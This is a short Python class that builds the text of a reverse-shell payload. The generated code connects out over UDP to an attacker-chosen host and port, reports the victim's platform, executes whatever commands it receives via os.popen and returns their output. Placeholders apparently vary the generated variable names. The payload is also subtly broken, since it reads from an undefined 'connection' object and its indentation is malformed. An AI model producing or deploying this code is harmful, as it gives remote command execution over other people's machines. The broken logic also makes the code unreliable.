class Payload:
    def __init__(self, host: str, port: int, strs: list):
        self.host, self.port, self.strs = host, port, strs

    def create(self):
        return """
{connected} = False\nwhile not {connected} :\n\ttry :
\t\tconn = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
\t\tconn.connect(('{host}' , int({port})))
\t\t{connected} = True 
\texcept :\n\t{connected} = False\n\twhile {connected} :\n\t\ttry : 
\t\t\tconn.send((sys.platform).encode("UTF-8"))
\t\t\tconn.send(os.popen(connection.recv(1024).decode("UTF-8")).read().encode("UTF-8"))
\t\texcept :
\t\t\t{connected} = False
                """.format(port=str(self.port), host=self.host,
                           connected=self.strs[0])
